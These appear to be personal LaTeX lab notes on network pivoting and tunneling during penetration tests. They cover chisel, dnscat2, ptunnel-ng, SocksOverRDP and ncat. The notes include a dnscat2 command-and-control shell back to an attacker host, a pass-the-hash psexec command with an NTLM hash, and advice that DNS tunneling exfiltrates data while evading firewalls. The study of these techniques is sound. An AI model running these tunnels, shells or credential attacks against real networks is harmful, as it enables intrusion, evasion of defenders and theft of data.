\chapter{Pivoting}
\section{Intrroduction}
{\bf Pivoting} is essentially the idea of moving to other
 networks through a compromised host to find more targets on different network
 segments.

 There are many different terms used to describe a compromised host that can be
 used to pivot to a previously unreachable network segment. Some of the most
 common are:
 \begin{itemize}
     \item  Pivot Host
     \item  Proxy
     \item  Foothold
     \item  Beach Head system
     \item  Jump Host
 \end{itemize}


Pivoting's primary use is to defeat segmentation (both physically and
virtually) to access an isolated network. {\bf Tunneling}, on the other hand, is a
subset of pivoting. Tunneling encapsulates network traffic into another
protocol and routes traffic through it. The key is {\bf obfuscation} to avoid
detection for as long as possible. Therefore protocols with enhanced security
measures such as HTTPS over TLS or SSH over other transport protocols are used.

{\bf Port forwarding} is a technique that allows to redirect a communication request
from one port to another. Port forwarding uses TCP as the primary communication
layer to provide interactive communication for the forwarded port. However,
different application layer protocols such as SSH or even
\href{https://en.wikipedia.org/wiki/SOCKS}{SOCKS} (non-application layer) can
be used to encapsulate the forwarded traffic. This can be effective in
bypassing firewalls and using existing services on compromised host to pivot to
other networks.

The reason SSH port forwarding is so popular is because SSH client-server
session provides most of the requirements for network traffic, so port
forwarding is a logical extension of the SSH functionality.

$PIP = $pivot_ip
$LIP = $attacker_ip
$LPORT 
$TIP = $target_id
$TPORT = $target_port

\section{SOCKS5 tunneling with chisel}
\url{https://ppn.snovvcrash.rocks/pentest/infrastructure/pivoting#chisel}
\url{https://ap3x.github.io/posts/pivoting-with-chisel/}


\href{https://github.com/jpillora/chisel}{Chisel} is a TCP/UDP-based tunneling
tool that uses HTTP to transport data that is secured using SSH. Chisel can
create a client-server tunnel connection in a firewall restricted environment.

\subsection{Server on pivot}
\subsubsection{On pivot}
\begin{verbatim}
./chisel server -v -p 1234 --socks5
\end{verbatim}

\subsubsection{On attacker}


\begin{verbatim}
./chisel client -v $P_IP:1234 socks
\end{verbatim}

edit \verb+/etc/proxychains.conf+ to happen \verb+ socks5   127.0.0.1:1080+

\subsection{Server on attacker(Reverse pivot)}
\subsubsection{on the attacker}

\begin{verbatim}
chisel server -p 8001 --reverse --socks5
\end{verbatim}

edit \verb+/etc/proxychains.conf+ to happen \verb+ socks5   127.0.0.1:1080+

After client connexion:
\begin{verbatim}
proxychains4 psexec.py -hashes 00000000000000000000000000000000:27dedb1dab4d8545c6e1c66fba077da0 Administrator@172.16.6.3
\end{verbatim}

\subsubsection{on the pivot}

\begin{verbatim}
create a reverse proxy and open port 1080 on attacker
chisel client IP_ATTACKER:8001 R:socks
\end{verbatim}

\section{DNS tunneling with dnscat2}
\href{https://github.com/iagox86/dnscat2}{Dnscat2} is a tunneling tool that
uses DNS protocol to send data between two hosts. It uses an encrypted
Command-\&-Control (C\&C or C2) channel and sends data inside TXT records
within the DNS protocol. 

Usually, every active directory domain environment in
a corporate network will have its own DNS server, which will resolve hostnames
to IP addresses and route the traffic to external DNS servers participating in
the overarching DNS system. 

However, with dnscat2, the address resolution is requested from an external
server. When a local DNS server tries to resolve an address, data is
exfiltrated and sent over the network instead of a legitimate DNS request. a

Dnscat2 can be an {\bf extremely stealthy approach} to exfiltrate data while

evading firewall detections which strip the HTTPS connections and sniff the
traffic. 

\subsection{On attacker}
\begin{verbatim}
sudo ruby dnscat2.rb --dns host=$L_IP,port=53,domain=inlanefreight.local --no-cache
\end{verbatim}


it will provide us the secret key that must be provided to the dnscat2 client in
order to authenticate and encrypt the communication

\subsection{On pivot}
use
\href{https://github.com/lukebaggett/dnscat2-powershell}{dnscat2-powershell}, a
dnscat2 compatible PowerShell-based client that we can run from Windows
targets.

\begin{verbatim}
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver $L_IP -Domain inlanefreight.local \
    -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
\end{verbatim}

\section{ICMP tunneling with SOCKS}

ICMP tunneling encapsulates your traffic within ICMP packets containing echo
requests and responses. ICMP tunneling would only work when ping responses are
permitted within a firewalled network. When a host within a firewalled network
is allowed to ping an external server, it can encapsulate its traffic within
the ping echo request and send it to an external server. The external server
can validate this traffic and send an appropriate response, which is extremely
useful for data exfiltration and creating pivot tunnels to an external server.a

\href{https://github.com/utoni/ptunnel-ng}{ptunel-ng} is a tool that can be
used 


\subsection{On pivot}
\begin{verbatim}
sudo ./ptunnel-ng -r$P_IP -R22
\end{verbatim}



\subsection{On attacker}
\begin{verbatim}
 sudo ./ptunnel-ng -p$P_IP -l2222 -r$P_IP -R22
\end{verbatim}

\subsubsection{Tunneling an SSH connection through}

\begin{verbatim}
ssh -p2222 -l$P_LOGIN 127.0.0.1
\end{verbatim}

\subsubsection{Enabling Dynamic Port Forwarding over SSH}
\begin{verbatim}
ssh -D 9050 -p2222 -l$P_LOGIN 127.0.0.1
proxychains nmap -sV -sT 172.16.5.19 -p3389
\end{verbatim}

\section{RDP/SOCKS Tunneling with SocksOverRDP}


When limited to a Windows network (not able to use SSH for pivoting) it is
possible to use tools available for Windows operating systems. 
\href{https://github.com/nccgroup/SocksOverRDP}{SocksOverRDP} is a toom that
uses {\bf Dynamic Virtual Channels} (DVC) from the Remote Desktop Service
feature of Windows. DVC is responsible for tunneling packets over the RDP
connection. Some examples of usage of this feature would be clipboard data
transfer and audio sharing. However, this feature can also be used to tunnel
arbitrary packets over the network.

\href{https://www.proxifier.com/}{Proxifier} can be used as proxy server.

\begin{verbatim}
regsvr32.exe SocksOverRDP-Plugin.dll
\end{verbatim}

Now we can connect to 172.16.5.19 over RDP using mstsc.exe, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. 

We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.
 
When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.

\begin{verbatim}
netstat -antb | findstr 1080
\end{verbatim}

After starting our listener, we can transfer Proxifier portable to the Windows
10 target (on the 10.129.x.x network), and configure it to forward all our
packets to 127.0.0.1:1080. Proxifier will route traffic through the given host
and port. 

With Proxifier configured and running, we can start mstsc.exe, and it will use
Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it
over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using
SocksOverRDP-server.exe.



\section{HTTP/SOCKS tunneling with ncat}

ncat can be setup as an http proxy which can be used similar to a socks proxy. Just run the ncat proxy on the target machine, and update the local proxychains config to use an http proxy.

Unfortunately, ncat is almost never going to be installed by default on a target machine, unless someone has also installed nmap there.

\subsubsection{Target machine - setup ncat listener}
\begin{verbatim}
ncat -vv --listen 3128 --proxy-type http # or socks5
\end{verbatim}




\subsubsection{attacker machine}
\begin{verbatim}
tail /etc/proxychains.conf -n 3
# defaults set to "tor"
#socks4 	127.0.0.1 9050
http 172.21.0.3  3128 # 172.21.0.3 is the IP of my ssh machine

proxychains nmap -sT -P0 -p8080,9001 172.20.0.2
\end{verbatim}
